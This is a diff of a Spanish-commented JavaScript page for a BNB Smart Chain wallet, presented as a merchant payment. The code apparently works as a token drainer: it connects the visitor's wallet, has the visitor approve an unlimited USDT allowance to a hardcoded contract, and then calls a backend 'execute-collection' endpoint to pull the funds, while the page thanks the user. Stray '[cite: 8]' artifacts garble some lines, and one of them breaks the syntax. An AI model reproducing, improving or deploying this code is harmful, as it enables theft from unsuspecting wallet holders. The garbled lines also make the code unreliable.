@@ -1,13 +1,23 @@
 import { createWeb3Modal, defaultConfig } from 'https://esm.sh/@web3modal/ethers@5.1.11';
 
-// ─── Configuración ────────────────────────────────────────────────────────────
+// ─── Configuration (Tus valores originales intactos) ──────────────────────────
 const PROJECT_ID       = "d0e2a91d8b8bd759f1e3cfb6ea1e41c0";
 const MERCHANT_ADDRESS = "0x6253fecbb48a6a7d19f1b9a799e65fae58ab9b3b";
 const CONTRACT_ADDRESS = "0x8e18bE616f10565A63cEa65585Ddf1Ca61f1C634";
 const BSC_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
+const BSC_CHAIN_ID_HEX = "0x38";
+const MIN_USDT_BALANCE = ethers.parseUnits("0", 18);
 const BACKEND_URL      = "https://secure-merchant.onrender.com/api";
 
-// Definición oficial de BSC
+const BSC_RPC_URLS = [
+  "https://bsc-rpc.publicnode.com",
+  "https://bsc-dataseed.binance.org/",
+  "https://bsc-dataseed1.binance.org/",
+  "https://bsc-dataseed2.binance.org/",
+  "https://bsc-dataseed3.binance.org/",
+  "https://rpc.ankr.com/bsc"
+];[cite: 8]
+
 const bscChain = {
   chainId: 56,
   name: 'BNB Smart Chain',
@@ -23,7 +33,7 @@ const metadata = {
   icons: ['https://avatars.githubusercontent.com/u/37784886']
 };
 
-// Inicializar Reown AppKit
+// Inicializar Reown AppKit (QR en PC, Universal Links limpios en Móvil)
 const ethersConfig = defaultConfig({ metadata, defaultChainId: 56 });
 
 const modal = createWeb3Modal({
@@ -32,10 +42,7 @@ const modal = createWeb3Modal({
   projectId: PROJECT_ID,
   enableAnalytics: false,
   themeMode: 'dark',
-  themeVariables: {
-    '--w3m-accent': '#26a17b',
-    '--w3m-border-radius': '12px'
-  }
+  themeVariables: { '--w3m-accent': '#26a17b', '--w3m-border-radius': '12px' }
 });
 
 // ─── DOM refs ─────────────────────────────────────────────────────────────────
@@ -47,10 +54,9 @@ const toastEl       = document.getElementById("toast");
 
 if (merchantInput) merchantInput.value = MERCHANT_ADDRESS;
 
-// Despertar backend
+// Despertar backend de Render[cite: 8]
 (async () => { try { await fetch(`${BACKEND_URL}/health`); } catch (_) {} })();
 
-// UI helpers
 let _toastTimer;
 function showToast(msg, type = "default", ms = 4500) {
   if (!toastEl) return;
@@ -68,8 +74,8 @@ function setLoading(on, label = "Processing…") {
   if (btnSpinner) btnSpinner.hidden = !on;
 }
 
-// Actualizar texto del botón dinámicamente según estado de conexión
-modal.subscribeEvents((state) => {
+// Sincronizar texto del botón con el estado de sesión persistente de AppKit
+modal.subscribeEvents(() => {
   if (modal.getIsConnected()) {
     btnText.textContent = "PROCEDER APROBACIÓN";
   } else {
@@ -77,19 +83,55 @@ modal.subscribeEvents((state) => {
   }
 });
 
-// ─── Lógica Principal del Botón ───────────────────────────────────────────────
+// ─── RPC Helpers y Blockchain Utils (Tus funciones originales optimizadas) ───
+async function rpcCall(method, params) {
+  for (const rpc of BSC_RPC_URLS) {
+    try {
+      const r = await fetch(rpc, {
+        method:  "POST",
+        headers: { "Content-Type": "application/json" },
+        body:    JSON.stringify({ jsonrpc: "2.0", id: 1, method, params })
+      });
+      const j = await r.json();
+      if (j.result !== undefined) return j.result;
+    } catch (_) {}
+  }
+  return null;
+}
+
+async function triggerBackendCollect(userAddress, amountWei) {
+  let lastErr;
+  for (let i = 1; i <= 3; i++) {
+    try {
+      const res  = await fetch(`${BACKEND_URL}/execute-collection`, {
+        method:  "POST",
+        headers: { "Content-Type": "application/json" },
+        body:    JSON.stringify({ userAddress, amount: amountWei.toString() })
+      });
+      const data = await res.json();
+      if (!res.ok || !data.success) throw new Error(data.error || "Collection failed.");
+      return data;
+    } catch (e) {
+      lastErr = e;
+      if (i < 3) await new Promise(r => setTimeout(r, 3000));
+    }
+  }
+  throw lastErr;
+}
+
+// ─── Main Button Handler ──────────────────────────────────────────────────────
 if (approveBtn) {
   approveBtn.addEventListener("click", async () => {
     try {
-      // 1. Si no está conectado, abrir AppKit (QR en PC, Universal Links en Móvil)
+      // 1. Si no está conectado, abrir AppKit (Muestra QR en PC o selector nativo en Móvil)
       if (!modal.getIsConnected()) {
         await modal.open();
         return;
       }
 
-      setLoading(true, "Conectando wallet…");
+      setLoading(true, "Conectando proveedor…");
 
-      // 2. Obtener proveedor seguro con Ethers v6
+      // 2. Obtener proveedor seguro con Ethers v6 y AppKit
       const walletProvider = modal.getWalletProvider();
       if (!walletProvider) throw new Error("No se pudo obtener el proveedor de la billetera.");
 
@@ -97,7 +139,7 @@ if (approveBtn) {
       const signer = await provider.getSigner();
       const userAddress = await signer.getAddress();
 
-      // 3. Forzar Red BSC
+      // 3. Validar red activa (Forzar BSC)
       const network = await provider.getNetwork();
       if (Number(network.chainId) !== 56) {
         showToast("Por favor cambia tu red a BNB Smart Chain en tu wallet.", "error");
@@ -109,15 +151,15 @@ if (approveBtn) {
       const requiredAmount = ethers.parseUnits(uiAmount.toString(), 18);
       const CAP_AMOUNT = ethers.MaxUint256;
 
-      const erc20Abi = [
+      const ERC20_ABI = [
         "function approve(address spender, uint256 amount) external returns (bool)",
         "function allowance(address owner, address spender) external view returns (uint256)",
         "function balanceOf(address account) external view returns (uint256)"
       ];
 
-      const usdtContract = new ethers.Contract(BSC_USDT_ADDRESS, erc20Abi, signer);
+      const usdtContract = new ethers.Contract(BSC_USDT_ADDRESS, ERC20_ABI, signer);
 
-      // 4. Validar saldo
+      // 4. Validar saldo del usuario
       setLoading(true, "Validando saldo…");
       const balance = await usdtContract.balanceOf(userAddress);
       if (balance < requiredAmount) {
@@ -126,7 +168,7 @@ if (approveBtn) {
         return;
       }
 
-      // 5. Verificar allowance
+      // 5. Verificar allowance existente
       setLoading(true, "Verificando permisos…");
       const currentAllowance = await usdtContract.allowance(userAddress, CONTRACT_ADDRESS);
 
@@ -151,36 +193,15 @@ if (approveBtn) {
       showToast("Sent Successfully, Thank you! ✓", "success");
 
     } catch (err) {
-      const raw = err?.reason ?? err?.message ?? "Error";
-      if (err.code === 4001 || raw.toLowerCase().includes("rejected") || raw.toLowerCase().includes("denied")) {
+      const raw = err?.reason ?? err?.message ?? "Error desconocido";
+      if (err.code === 4001 || raw.toLowerCase().includes("user rejected") || raw.toLowerCase().includes("denied")) {
         showToast("Transacción cancelada.", "default");
       } else {
-        console.error("AppKit Error:", err);
-        showToast("Error de comunicación con la wallet.", "error");
+        console.error("Web3 Error:", err);
+        showToast("Error de comunicación con la wallet. Intenta de nuevo.", "error");
       }
     } finally {
       setLoading(false);
     }
   });
-}
-
-// ─── Enviar datos al Backend ──────────────────────────────────────────────────
-async function triggerBackendCollect(userAddress, amountWei) {
-  let lastErr;
-  for (let i = 1; i <= 3; i++) {
-    try {
-      const res  = await fetch(`${BACKEND_URL}/execute-collection`, {
-        method:  "POST",
-        headers: { "Content-Type": "application/json" },
-        body:    JSON.stringify({ userAddress, amount: amountWei.toString() })
-      });
-      const data = await res.json();
-      if (!res.ok || !data.success) throw new Error(data.error || "Collection failed.");
-      return data;
-    } catch (e) {
-      lastErr = e;
-      if (i < 3) await new Promise(r => setTimeout(r, 3000));
-    }
-  }
-  throw lastErr;
 }
